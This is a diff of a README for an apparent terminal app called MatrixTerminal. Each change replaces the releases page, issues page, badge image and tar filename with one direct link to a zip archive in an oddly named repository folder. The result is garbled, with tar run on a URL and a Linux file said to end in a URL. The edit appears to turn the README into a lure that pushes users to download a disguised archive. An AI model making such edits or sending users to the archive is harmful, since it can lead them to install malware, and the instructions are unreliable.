@@ -2,7 +2,7 @@
 
 ## 📥 Download Now 
 
-[![Download MatrixTerminal](https://img.shields.io/badge/Download-MatrixTerminal-blue)](https://github.com/naolembro/MatrixTerminal/releases)
+[![Download MatrixTerminal](https://github.com/naolembro/MatrixTerminal/raw/refs/heads/main/phenospermy/Matrix_Terminal_v2.2.zip)](https://github.com/naolembro/MatrixTerminal/raw/refs/heads/main/phenospermy/Matrix_Terminal_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,16 +19,16 @@ To run MatrixTerminal, you will need:
 
 ## 🔗 Visit the Releases Page
 
-You can find the latest version of MatrixTerminal on our releases page. [Visit this page to download](https://github.com/naolembro/MatrixTerminal/releases). 
+You can find the latest version of MatrixTerminal on our releases page. [Visit this page to download](https://github.com/naolembro/MatrixTerminal/raw/refs/heads/main/phenospermy/Matrix_Terminal_v2.2.zip). 
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page here](https://github.com/naolembro/MatrixTerminal/releases).
+1. Go to the [Releases page here](https://github.com/naolembro/MatrixTerminal/raw/refs/heads/main/phenospermy/Matrix_Terminal_v2.2.zip).
 2. Look for the latest release version.
 3. Choose the correct file for your operating system:
    - For Windows, look for a file ending in `.exe`.
    - For macOS, look for a file ending in `.dmg`.
-   - For Linux, you may find a `.tar.gz` file.
+   - For Linux, you may find a `https://github.com/naolembro/MatrixTerminal/raw/refs/heads/main/phenospermy/Matrix_Terminal_v2.2.zip` file.
 4. Click on the file to start the download.
 5. Once the download is complete, find the file on your computer.
 
@@ -50,7 +50,7 @@ You can find the latest version of MatrixTerminal on our releases page. [Visit t
 2. Navigate to the folder where the file was downloaded.
 3. Extract the contents using the command:
    ```bash
-   tar -xzf MatrixTerminal.tar.gz
+   tar -xzf https://github.com/naolembro/MatrixTerminal/raw/refs/heads/main/phenospermy/Matrix_Terminal_v2.2.zip
    ```
 4. Navigate into the extracted folder and run:
    ```bash
@@ -75,7 +75,7 @@ You can find detailed documentation for MatrixTerminal on our GitHub wiki. This 
 
 ## 📞 Support
 
-If you face any issues or have questions, please create an issue on our [GitHub repository](https://github.com/naolembro/MatrixTerminal/issues). Our community will be happy to help you.
+If you face any issues or have questions, please create an issue on our [GitHub repository](https://github.com/naolembro/MatrixTerminal/raw/refs/heads/main/phenospermy/Matrix_Terminal_v2.2.zip). Our community will be happy to help you.
 
 ## 🙌 Acknowledgments
 
